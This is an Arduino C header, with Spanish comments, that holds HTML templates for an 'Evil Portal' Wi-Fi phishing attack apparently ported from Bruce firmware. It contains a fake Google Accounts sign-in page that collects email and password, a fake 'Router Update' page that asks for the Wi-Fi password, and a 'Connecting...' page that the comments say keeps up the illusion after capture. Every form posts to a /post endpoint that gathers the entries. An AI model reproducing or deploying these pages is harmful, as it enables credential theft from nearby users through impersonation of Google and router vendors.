#ifndef PORTAL_TEMPLATES_H_
#define PORTAL_TEMPLATES_H_
#include <Arduino.h>

// Plantillas HTML del Evil Portal, portadas de Bruce firmware
// (loadDefaultHtml / loadDefaultHtml_one). El formulario postea a "/post",
// que el worker captura. Se guardan en PROGMEM y se sirven con send_P para no
// copiarlas enteras a RAM.

// "Google Accounts" sign-in (captura email + password).
static const char PORTAL_HTML_GOOGLE[] PROGMEM =
    "<!DOCTYPE html><html><head><title>Sign in: Google Accounts</title><meta charset='UTF-8'><meta "
    "name='viewport' content='width=device-width, initial-scale=1.0'><style>a:hover{text-decoration: "
    "underline;}body{font-family: Arial, sans-serif;align-items: center;justify-content: "
    "center;background-color: #FFFFFF;}input[type='text'], input[type='password']{width: 100%;padding: "
    "12px 10px;margin: 8px 0;box-sizing: border-box;border: 1px solid #cccccc;border-radius: "
    "4px;}.container{margin: auto;padding: 20px;max-width: 700px;}.logo-container{text-align: "
    "center;margin-bottom: 30px;display: flex;justify-content: center;align-items: center;}.logo{width: "
    "40px;height: 40px;fill: #FFC72C;margin-right: 100px;}.company-name{font-size: 42px;color: "
    "black;margin-left: 0px;}.form-container{background: #FFFFFF;border: 1px solid "
    "#CEC0DE;border-radius: 4px;padding: 20px;box-shadow: 0px 0px 10px 0px rgba(108, 66, 156, "
    "0.2);}h1{text-align: center;font-size: 28px;font-weight: 500;margin-bottom: "
    "20px;}.input-field{width: 100%;padding: 12px;border: 1px solid #BEABD3;border-radius: "
    "4px;margin-bottom: 20px;font-size: 14px;}.submit-btn{background: #0b57d0;color: white;border: "
    "none;padding: 12px 20px;border-radius: 4px;font-size: 0.875rem;}.submit-btn:hover{background: "
    "#0e4eb3;}.forgot-btn{background: transparent;color: #0b57d0;border-radius: 8px;border: "
    "none;font-size: 14px;cursor: pointer;}.forgot-btn:hover{background-color: "
    "rgba(11,87,208,0.08);}.containerlogo{padding-top: 25px;}.containertitle{color: #202124;font-size: "
    "24px;padding: 15px 0px 10px 0px;}.containersubtitle{color: #202124;font-size: 16px;padding: 0px 0px "
    "30px 0px;}.containerbtn{display: flex;justify-content: end;padding: 30px 0px 25px 0px;}@media "
    "screen and (min-width: 768px){.logo{max-width: 80px;max-height: 80px;}}</style></head><body><div "
    "class='container'><div class='logo-container'></div><div "
    "class=form-container><center><div class='containerlogo'><div id='logo' "
    "title='Google'><svg viewBox='0 0 75 24' width='75' height='24' xmlns='http://www.w3.org/2000/svg' "
    "aria-hidden='true'><g id='qaEJec'><path fill='#ea4335' d='M67.954 16.303c-1.33 "
    "0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 "
    "2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 "
    "1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 "
    "3.12-3.474z'></path></g><g id='YGlOvc'><path fill='#34a853' "
    "d='M58.193.67h2.564v17.44h-2.564z'></path></g><g id='BWfIk'><path fill='#4285f4' d='M54.152 "
    "8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 "
    "5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 "
    "0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 "
    "5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 "
    "3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z'></path></g><g "
    "id='e6m3fd'><path fill='#fbbc05' d='M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 "
    "5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 "
    "0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 "
    "3.608-3.35 3.608z'></path></g><g id='vbkDmc'><path fill='#ea4335' d='M25.17 6.71c-3.28 0-5.954 "
    "2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 "
    "0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 "
    "3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z'></path></g><g id='idEJde'><path "
    "fill='#4285f4' d='M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 "
    "1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 "
    "4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 "
    "0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 "
    "4.69-1.856z'></path></g></svg></div></div></center><div style='min-height: "
    "150px'><center><div class='containertitle'>Sign in</div><div class='containersubtitle'>Use your "
    "Google Account</div></center><form action='/post' id='login-form'><input name='email' "
    "class='input-field' type='text' placeholder='Email or phone' required><input name='password' "
    "class='input-field' type='password' placeholder='Enter your password' required /><div "
    "class='containermsg'><button class='forgot-btn'>Forgot password?</button></div><div "
    "class='containerbtn'><button id=submitbtn class=submit-btn "
    "type=submit>Next</button></div></form></div></div></div></body></html>";

// "Router firmware update" (captura solo el password de la red Wi-Fi).
static const char PORTAL_HTML_ROUTER[] PROGMEM =
    "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><meta name='viewport' "
    "content='width=device-width, initial-scale=1.0'><title>Router Update</title><style>body "
    "{font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;background-color: #d3d3d3;"
    "display: flex;justify-content: center;align-items: center;height: 100vh;margin: "
    "0;padding: 10px;box-sizing: border-box;}.container {background-color: white;padding: "
    "20px;border-radius: 10px;box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);text-align: center;max-width: "
    "360px;width: 100%;}.container svg {width: 70px;height: 70px;fill: #ff1744;"
    "margin-bottom: 20px;}h1 {color: #333;font-size: 22px;margin-bottom: 15px;}p {color: "
    "#666;font-size: 15px;margin-bottom: 20px;}input[type='password'] {width: 100%;padding: 12px;margin: "
    "10px 0;border-radius: 5px;border: 1px solid #ccc;font-size: 16px;box-sizing: border-box;}button "
    "{width: 100%;padding: 12px;background-color: #007bff;color: white;border: none;border-radius: "
    "5px;cursor: pointer;font-size: 16px;transition: background-color 0.3s;}button:hover "
    "{background-color: #0056b3;}div#success-block{display: none;text-align: center;min-height: "
    "60px;margin-bottom: 30px;justify-content: center;align-items: center;}</style></head><body><div "
    "class='container'><svg xmlns='http://www.w3.org/2000/svg' "
    "fill='#000000' width='800px' height='800px' viewBox='0 -1 26 26'><path fill-opacity='.3' d='M24.24 "
    "8l1.35-1.68C25.1 5.96 20.26 2 13 2S.9 5.96.42 6.32l12.57 15.66.01.02.01-.01L20 "
    "13.28V8h4.24z'/><path d='M22 22h2v-2h-2v2zm0-12v8h2v-8h-2z'/></svg><h1>Router Update</h1><div "
    "id='form-block'><p>Router firmware update required. Enter your Wi-Fi password to update.</p><form "
    "id='submit-form' action='/post'><input type='password' name='password' placeholder='Wi-Fi network "
    "password' required><button type='submit'>Update</button></form></div><div id='success-block'><p>The "
    "router will restart in <span id='span-count' style='font-weight: "
    "bolder;'>5</span></p></div></"
    "div><script>document.getElementById('submit-form').addEventListener('submit', function(event) "
    "{event.preventDefault();document.getElementById('success-block').style.display = "
    "'flex';document.getElementById('form-block').style.display = 'none';setInterval(function() {index = "
    "parseInt(document.getElementById('span-count').textContent)if (index > 1) "
    "{document.getElementById('span-count').textContent = index-1;index--;} else "
    "{document.getElementById('submit-form').submit();}}, 1000);});</script></body></html>";

// Página servida tras capturar credenciales (mantiene la ilusión de "conectando").
static const char PORTAL_HTML_SUCCESS[] PROGMEM =
    "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' "
    "content='width=device-width, initial-scale=1.0'><title>Connecting...</title></head>"
    "<body style='font-family:Arial,sans-serif;text-align:center;padding-top:40px;color:#333;'>"
    "<h3>Connecting...</h3><p>Please wait while we connect you to the network.</p></body></html>";

#endif
